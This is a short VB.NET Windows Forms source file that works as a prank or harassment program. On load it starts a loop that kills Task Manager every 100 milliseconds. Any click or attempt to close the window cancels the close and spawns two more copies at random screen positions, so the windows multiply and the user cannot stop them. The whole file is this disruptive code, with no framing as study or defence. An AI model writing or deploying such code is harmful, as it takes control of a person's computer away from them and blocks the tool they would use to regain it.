Public Class Form1
    Sub Block()
        While True
            For Each k As Process In Process.GetProcessesByName("taskmgr")
                k.Kill()
            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim t As New Threading.Thread(AddressOf Block)
        t.Start()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Hide()
        For i = 0 To 1 Step 1
            Dim Form1 As New Form1
            Form1.Location = New Point(CInt(Int((Screen.PrimaryScreen.Bounds.Width * Rnd()) + 1)), CInt(Int((Screen.PrimaryScreen.Bounds.Height * Rnd()) + 1)))
            Form1.Show()
        Next
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Me.Hide()
        For i = 0 To 1 Step 1
            Dim Form1 As New Form1
            Form1.Location = New Point(CInt(Int((Screen.PrimaryScreen.Bounds.Width * Rnd()) + 1)), CInt(Int((Screen.PrimaryScreen.Bounds.Height * Rnd()) + 1)))
            Form1.Show()
        Next
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Me.Hide()
        For i = 0 To 1 Step 1
            Dim form1 As New Form1
            form1.Location = New Point(CInt(Int((Screen.PrimaryScreen.Bounds.Width * Rnd()) + 1)), CInt(Int((Screen.PrimaryScreen.Bounds.Height * Rnd()) + 1)))
            form1.Show()
        Next
        e.Cancel = True
    End Sub
End Class
